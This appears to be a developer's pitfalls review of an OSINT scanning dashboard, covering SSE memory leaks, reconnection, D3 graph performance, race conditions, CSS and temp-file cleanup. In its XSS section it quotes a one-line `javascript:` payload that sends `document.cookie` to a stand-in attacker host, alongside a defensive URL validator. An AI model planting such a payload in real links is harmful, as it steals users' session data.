# Domain Pitfalls: OSINT Web Dashboard (FastAPI + Vanilla JS + D3.js)

**Domain:** Real-time OSINT scanner with SSE progress streaming, D3 graph, vanilla JS state
**Researched:** 2026-05-06
**Codebase refs:** `web-enhanced/server.py`, `web-enhanced/scanner.py`, `web-enhanced/static/app.js`

---

## Critical Pitfalls

Mistakes that cause data loss, security vulnerabilities, or full rewrites.

---

### Pitfall 1: SSE generator keeps running after client disconnects

**What goes wrong:**
The `event_stream()` generator in `server.py` (lines 76-95) loops indefinitely on `job.queue.get()`. When a browser tab is closed or the connection is dropped mid-scan, FastAPI does not automatically cancel the generator. The generator sits blocked on `await job.queue.get()`, holding the connection open in TCP CLOSE_WAIT. Meanwhile `scanner.py` keeps pushing events to `job.queue`. The queue is `asyncio.Queue()` with no `maxsize`, so it grows without bound. Documented real-world growth rate: 14.5 MB/sec with zombie connections.

**Why it happens:**
FastAPI's `StreamingResponse` does not propagate HTTP disconnect signals into the async generator. The generator must explicitly poll for disconnect. The current code has no such check.

**Consequences:**
- Memory leak if the user navigates away mid-scan (common during long 500-site scans)
- Queue accumulates all remaining scan events, never consumed
- No upper bound: a 500-site scan at, say, 200 bytes/event adds ~100 KB per orphaned job; dozens of sessions compound this

**Prevention:**
Pass `request: Request` into the `scan_progress` endpoint and poll `await request.is_disconnected()` inside the generator loop. Break on disconnect and drain the queue. Alternatively, wrap the generator in a task and cancel it on disconnect.

```python
# Pattern
async def event_stream():
    while True:
        if await request.is_disconnected():
            break
        try:
            event = await asyncio.wait_for(job.queue.get(), timeout=5)
        except asyncio.TimeoutError:
            yield ": keepalive\n\n"
            continue
        ...
```

**Detection:**
Add a `GET /api/debug/jobs` endpoint counting `jobs` dict length during development. A rising count after users close tabs confirms the leak.

**Phase:** Address in the stability pass before any visual work. A memory leak invalidates all subsequent testing.

---

### Pitfall 2: Unvalidated URLs set as `href` — `javascript:` protocol XSS

**What goes wrong:**
In `app.js` lines 316-318, profile URLs from maigret scan results are directly assigned to `a.href`:

```js
const a = document.createElement('a');
a.href = p.url;   // p.url is maigret site_url_user — externally sourced
a.textContent = p.url;
```

`showLiveHit()` (lines 535-548) also sets `a.href = url` directly. Maigret's `site_url_user` is constructed from site templates and the scanned username. A malicious site definition in maigret's `data.json` or a custom database could produce a URL like `javascript:fetch('https://attacker.example/exfil?d='+document.cookie)`. When the analyst clicks the link, code executes in the browser.

**Why it happens:**
The code correctly uses `document.createElement` rather than `innerHTML` everywhere (good), but the `href` attribute is a special sink. HTML-escaping a `href` value does not neutralise the `javascript:` pseudo-protocol.

**Consequences:**
A modified or compromised `data.json` can silently exfiltrate analyst session data when they click any result link. OSINT analysts regularly use custom databases.

**Prevention:**
Validate every URL before assigning it to `href`. Reject anything that does not start with `https://` or `http://`.

```js
function safeHref(url) {
  if (!url) return '#';
  const lower = url.toLowerCase().trimStart();
  if (!lower.startsWith('http://') && !lower.startsWith('https://')) return '#';
  return url;
}
// Usage: a.href = safeHref(p.url);
```

**Detection:**
Test with a site definition whose URL template is `javascript:alert(document.domain)` and confirm the link is neutralised.

**Phase:** Fix before any deployment or sharing. One-line change; zero risk of regression.

---

### Pitfall 3: SSE error handler closes connection without attempting recovery

**What goes wrong:**
In `app.js` lines 161-170, `es.onerror` sets `done = true` and calls `es.close()`. The browser's native `EventSource` automatic reconnection is thereby suppressed. A single network hiccup during a long scan permanently ends progress tracking. The scan continues on the server but the client sees nothing. After 5-10 minutes the analyst assumes the scan failed.

**Why it happens:**
Browsers fire `onerror` for both fatal errors and transient network interruptions. Setting `done = true` on first error prevents recovery even when the scan is still running.

**Consequences:**
- Analyst restarts the scan unnecessarily, doubling server load
- Partial results already on `state.targets[username].profiles` are orphaned
- Inconsistent UX: scan shows "error" but the server eventually completes it

**Prevention:**
Track a reconnect attempt counter. On `onerror`, wait before reopening the `EventSource` (up to a maximum of 3 attempts). Poll `/api/scan/{id}/results` to check if the scan completed in the gap. Only mark permanent failure after exhausting retries or receiving a 4xx from the results endpoint.

**Detection:**
Throttle network in DevTools mid-scan and observe whether the UI recovers.

**Phase:** Address in the stability pass alongside pitfall 1.

---

## Moderate Pitfalls

---

### Pitfall 4: D3 force simulation not fully torn down on view switch

**What goes wrong:**
`renderGraph()` in `app.js` lines 388-464 calls `state.simulation.stop()` but only after the new simulation has already been created with fresh node objects. The old simulation's `tick` handler holds references to the previous SVG group `graphG` via closure. `svg.selectAll('*').remove()` deletes DOM nodes but the old `tick` closure still fires until the old simulation's alpha decays to zero (roughly 300 ticks at default `alphaDecay`). Each tick calls `.attr()` on removed DOM nodes, which D3 silently ignores but still iterates.

With 100+ nodes, each `tick` calls `.attr()` on 3 groups of elements (links, nodes, labels), meaning 300+ attribute write attempts per tick on ghost elements for several seconds after each re-render.

**Prevention:**
Stop and null out the previous simulation before creating a new one. `simulation.stop()` immediately halts the internal timer. Assign `state.simulation = null` before constructing the new one.

```js
if (state.simulation) {
  state.simulation.stop();
  state.simulation = null;
}
```

Also call `state.simulation.stop()` inside `showSearch()` which already does this correctly (line 561) — confirm this pattern is applied consistently to `renderGraph` re-entrant calls too.

**Detection:**
Open DevTools Performance panel. Switch to the graph tab twice in rapid succession with a 100-node result. Look for spike in scripting time 2-3 seconds after the second render.

**Phase:** Address in the graph polish phase.

---

### Pitfall 5: D3 labels render for all nodes at 100+ nodes, causing tick overhead

**What goes wrong:**
`renderGraph()` creates a `text` element for every node (line 441-449). At 100 nodes this is 100 SVG text elements updated on every tick. SVG text rendering is expensive compared to circles; `textContent` updates during simulation ticks prevent the browser from batching paint. Combined with 100 circles and N links, each tick touches 200+ SVG elements.

**Consequences:**
At 100 nodes, tick rate drops and the simulation appears sluggish. At 150+ nodes, the UI janks noticeably during the first 5-10 seconds of simulation convergence.

**Prevention:**
Only show labels on `group === 1` nodes (the username node) during simulation. Add labels for all nodes only after `simulation.on('end')` fires (alpha reaches `alphaMin`). Alternatively, hide labels on hover-only until simulation cools.

**Detection:**
Run a scan that returns 100+ profiles. Switch to the graph tab and observe frame rate via `chrome://gpu` or Performance panel.

**Phase:** Address in the graph polish phase, after core layout matches the mockup.

---

### Pitfall 6: Stale `state.targets[username]` reference during concurrent scans

**What goes wrong:**
When multiple usernames are scanned simultaneously, `listenProgress` closures capture `username` correctly. However `state.activeTarget` is a single string. `renderCurrentTarget()` always renders `state.targets[state.activeTarget]`. If SSE events arrive for a non-active target, `updateProgress()` updates the active target's progress bar only if `state.activeTarget === username` (correct). But `fetchResults()` calls `renderCurrentTarget()` unconditionally (line 231), which will re-render with data for whichever scan happens to finish last if the user has switched tabs between two scans finishing simultaneously.

**Consequences:**
Summary cards briefly show the wrong scan's data before correcting. On slow connections with two scans finishing within the same render cycle, the wrong profile count is displayed.

**Prevention:**
Guard `renderCurrentTarget()` calls inside `fetchResults()` with a check that the username completing is still the active target:

```js
if (state.activeTarget === username) {
  renderCurrentTarget();
}
```

This guard is already present on line 231 — confirm it is not stripped during refactoring.

**Detection:**
Start two simultaneous scans. Switch between target tabs rapidly as results arrive. Verify summary cards always match the selected tab.

**Phase:** Verify during multi-target testing in the stability pass.

---

### Pitfall 7: CSS specificity conflicts when aligning `app.js`-rendered elements to the mockup

**What goes wrong:**
`style.css` is shared between `index.html` (functional) and `mockup.html` (reference). The mockup uses component-level class names like `.tag-card`, `.profile-tag`, `.live-hit`. When visual-parity work adds more specific selectors to match mockup spacing precisely (e.g., `.result-tab.active .profile-tag`), those selectors can silently win over later additions for edge cases (hovered state, `.starred` variant) because dark UI components commonly accumulate 3-layer selectors. The result is that one fix breaks an adjacent component.

**Why it happens:**
Without a selector budget or cascade layer discipline, specificity-driven fixes compound. Each `!important` override added to fix a broken state creates a new ceiling that the next fix must beat.

**Prevention:**
Establish a single specificity tier for component states. Use single-class selectors for all variants: `.tag-card--active`, `.profile-tag--starred`. Avoid descendant selectors deeper than two levels. Do not use `!important` except for `.hidden` utilities. If two selectors conflict, resolve by moving declarations rather than adding specificity.

**Detection:**
Run the browser's CSS inspector on any styled component and confirm no rule shows `!important` except utility classes.

**Phase:** Enforce at the start of the visual parity phase before writing any new CSS.

---

## Minor Pitfalls

---

### Pitfall 8: `asyncio.create_task` in `start_scan` is fire-and-forget with no reference held

**What goes wrong:**
`server.py` line 58 calls `asyncio.create_task(run_scan(...))` without storing the returned task object. Python's event loop holds a weak reference to tasks. If GC runs before the task completes (unusual but possible under memory pressure), the task can be silently cancelled.

**Prevention:**
Store the task on the `ScanJob` object: `job.task = asyncio.create_task(run_scan(...))`. This adds a strong reference and also enables future cancellation when clients disconnect (pitfall 1 fix).

**Phase:** Fix in the same stability pass as the SSE disconnect issue.

---

### Pitfall 9: `showSearch()` resets `state.targets` but D3 simulation node drag handlers hold stale references

**What goes wrong:**
`showSearch()` sets `state.targets = {}` and calls `state.simulation.stop()`. But D3 drag handlers registered with `.call(d3.drag()...)` hold closures over node datum objects `d` (line 430-438). These closures reference `state.simulation` via `state.simulation.alphaTarget()`. After `showSearch()`, if any drag event fires on a ghost node (edge case during rapid UI interaction), it will call `state.simulation.alphaTarget()` on a stopped, nulled simulation, throwing a TypeError.

**Prevention:**
Set `state.simulation = null` after `.stop()` and guard the drag callbacks: `if (!state.simulation) return;` at the start of each drag handler.

**Phase:** Address in the graph polish phase.

---

### Pitfall 10: PDF and HTML export use `tempfile` without guaranteed cleanup on exception

**What goes wrong:**
`scanner.py` lines 239-246 and 251-257 create a temporary file, write to it, read it back, then call `os.unlink`. If `report.save_pdf_report()` or the subsequent `open()` raises an exception, `os.unlink` is never called and the temp file leaks. On a long-running server, failed PDF/HTML exports accumulate in `/tmp`.

**Prevention:**
Wrap both blocks in a `try/finally`:

```python
with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as f:
    tmp_path = f.name
try:
    report.save_pdf_report(tmp_path, context)
    with open(tmp_path, 'rb') as f:
        content = f.read()
finally:
    os.unlink(tmp_path)
```

**Phase:** Fix during the stability pass; low risk but easy to miss.

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|---|---|---|
| SSE stability | Orphaned generator + unbounded queue (Pitfall 1) | Add `request.is_disconnected()` poll; set `maxsize` on Queue |
| Error handling | Silent onerror suppresses recovery (Pitfall 3) | Implement reconnect counter with backoff |
| Visual parity CSS | Specificity debt accumulates fast (Pitfall 7) | Agree on selector budget before writing new rules |
| Graph tab | Old simulation ghost-ticking on removed nodes (Pitfall 4) | Stop and null simulation before re-creating |
| Graph tab (large datasets) | 100+ label elements tanking tick rate (Pitfall 5) | Defer labels to simulation end |
| Multi-target scans | Concurrent finish race condition (Pitfall 6) | Verify activeTarget guard is present post-refactor |
| Security | `javascript:` href on any profile URL (Pitfall 2) | Add `safeHref()` wrapper on all anchor assignments |
| Exports | Temp file leak on exception (Pitfall 10) | `try/finally` around `os.unlink` |
| Task lifecycle | GC-cancellable fire-and-forget tasks (Pitfall 8) | Store task reference on ScanJob |

---

## Sources

- MDN — [Using server-sent events](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events)
- FastAPI discussion — [Stop streaming response when client disconnects](https://github.com/fastapi/fastapi/discussions/7572)
- Jason Cameron — [Stop Burning CPU on Dead FastAPI Streams](https://jasoncameron.dev/posts/fastapi-cancel-on-disconnect)
- GitHub issue — [SSE CLOSE_WAIT unbounded queue growth](https://github.com/anomalyco/opencode/issues/22198)
- D3 — [Force simulation docs](https://d3js.org/d3-force/simulation)
- D3 GitHub — [Large graph performance issue](https://github.com/d3/d3/issues/1936)
- OWASP — [DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- PortSwigger — [Stored XSS into anchor href via javascript: protocol](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)
- Python CPython — [asyncio.Queue leaks memory on empty queue with frequent polling](https://github.com/python/cpython/issues/75801)
- CSS-Tricks — [Cascade Layers](https://css-tricks.com/css-cascade-layers/)
